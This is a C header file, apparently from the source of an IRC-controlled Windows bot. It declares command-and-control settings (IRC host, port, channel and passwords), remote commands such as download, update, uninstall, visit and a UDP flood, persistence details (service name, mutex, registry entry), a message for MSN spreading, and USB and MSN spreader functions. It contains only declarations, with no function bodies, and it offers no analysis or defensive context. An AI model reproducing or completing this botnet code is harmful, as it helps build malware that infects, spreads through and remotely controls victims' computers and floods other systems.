extern char				 cfg_mutex[];

extern unsigned long	 cfg_reconnectsleep; // msec
extern unsigned long	 cfg_ircmaxwaittime; // sec

//configurable info
extern char					cfg_password[];
extern char                 cfg_host[];
extern char                 cfg_bhost[];
extern unsigned short		cfg_port;
extern char					cfg_srvpass[];
extern char					cfg_channel[];
extern char					cfg_chanpass[];
extern char                 cfg_hiddenc[];
extern char                 cfg_hiddenp[];
extern char                 cfg_hostname[];
extern char                 cfg_protectp[];
extern char					cfg_p[];

extern BOOL					logged_in; //Says if your logged in
extern BOOL			        privlogged; // Says if you are also logged in private msg
extern BOOL                 TopicCommand;      

extern thread_s		threads[MAX_THREADS];
extern char			cfg_servicename[];
extern char			cfg_mutex[];
extern char			cfg_filename[];

//commands
extern char			cmd_join[];
extern char			cmd_leave[];
extern char         cmd_dc[];
extern char         cmd_protect[];
extern char			cmd_download[];
extern char			cmd_update[];
extern char			cmd_uninstall[];
extern char			cmd_login[];
extern char			cmd_logout[];
extern char         cmd_plogin[];
extern char			cmd_silence[];
extern char			cmd_visit[];
extern char         cmd_msnspread[];
extern char         cmd_udp[];
extern char			cmd_crypted[];

//installation stuff
extern char			szRegname[];
extern char			gotopth[];
extern char			exename[];
extern char			core[];

extern char msn_sendmsg[512]; // Contains custom message for msn spreading

extern HANDLE		xetum;


extern char			version[];
extern char         cversion[];


extern BOOL			silenced;


DWORD WINAPI USB_Spreader(LPVOID param);
DWORD WINAPI MsnFile1(LPVOID param);